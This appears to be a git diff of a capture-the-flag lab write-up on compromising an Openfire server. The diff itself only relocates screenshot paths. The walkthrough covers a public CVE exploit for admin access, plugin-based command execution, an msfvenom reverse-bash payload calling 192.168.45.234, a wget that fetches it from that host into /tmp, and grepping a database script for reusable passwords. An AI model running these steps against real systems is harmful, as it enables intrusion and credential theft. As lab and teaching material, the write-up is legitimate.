@@ -47,11 +47,11 @@ Nmap done: 1 IP address (1 host up) scanned in 42.91 seconds
 ```
 
 When I accessed port 9090, I was redirected to the Openfire admin console, which is used for managing and configuring the Openfire server.
-![](Fired1.png)
+![](Images/Fired1.png)
 Searched for public exploits available for openfire but found nothing. So we googled it and found one CVE.
-![](Fired2.png)
+![](Images/Fired2.png)
 We downloaded the exploit and try to run it but faced errors.
-![](Fired3.png)
+![](Images/Fired3.png)
 This is python module installation error. So whenever we'll face this issue we'll use following steps.
 ```sh
 sudo apt install python3-venv -y
@@ -60,56 +60,56 @@ source venv/bin/activate
 pip install hackrequests
 ```
 The Exploit was able to generate for me a Username and password that I could use to login.
-![](Fired4.png)
+![](Images/Fired4.png)
 Using the creds created for user we are able to login.
-![](Fired5.png)
+![](Images/Fired5.png)
 
 From this point, I followed the steps outlined in the Git repository to proceed with the exploitation.
-![](Fired6.png)
+![](Images/Fired6.png)
 We can download the plugin from below.
-![](Fired7.png)
+![](Images/Fired7.png)
 I navigated to the specified path and uploaded the `openfire-management-tool-plugin.jar` file as a plugin.
-![](Fired8.png)
+![](Images/Fired8.png)
 
-![](Fired9.png)
+![](Images/Fired9.png)
 After entering password, click on below dropdown and select system command.
-![](Fired10.png)
-![](Fired11.png)
+![](Images/Fired10.png)
+![](Images/Fired11.png)
 To get a revershe shell I tried some revs shells as nc, python3 but none worked. So I created a shell file whit msfvenom and upload to the target with wget to the /tmp directorie:
 ```sh
 msfvenom -p cmd/unix/reverse_bash LHOST=192.168.45.234 LPORT=9090 -f raw > reverse.sh
 ```
 
-![](Fired12.png)
+![](Images/Fired12.png)
 ```sh
 wget http://192.168.45.234:8000/reverse.sh -O /tmp/reverse.sh
 ```
 
-![](Fired13.png)
+![](Images/Fired13.png)
 After uploaded, I change the permissions to the file, then I execute it:
-![](Fired14.png)
+![](Images/Fired14.png)
 Executing the payload.
-![](Fired15.png)
+![](Images/Fired15.png)
 We got the shell.
-![](Fired16.png)
+![](Images/Fired16.png)
 Captured the local flag.
-![](Fired17.png)
+![](Images/Fired17.png)
 After getting the user flag it’s time to escalate our priviliges and get root, I ran linpeas as usual for privilege escalation and found two writable files.
-![](Fired18.png)
+![](Images/Fired18.png)
 I’ll investigate them next.
 
 In the /var/lib/openfire/embedded-db directory I examined the logs and the files and found interesting information:
 When we open the openfire.script, we found following
 `cat openfire.script`
 
-![](Fired19.png)
+![](Images/Fired19.png)
 I was able to run the following command on :  
 `cat openfire.script | grep “password”`
 
 And got the following credential :
-![](Fired20.png)
+![](Images/Fired20.png)
 Here, we found 2 user creds. So we'll try to authenticate with password `OpenFireAtEveryone`
 
-![](Fired21.png)
-![](Fired22.png)
+![](Images/Fired21.png)
+![](Images/Fired22.png)
 ### Method 2 we can login using root creds through SSH.
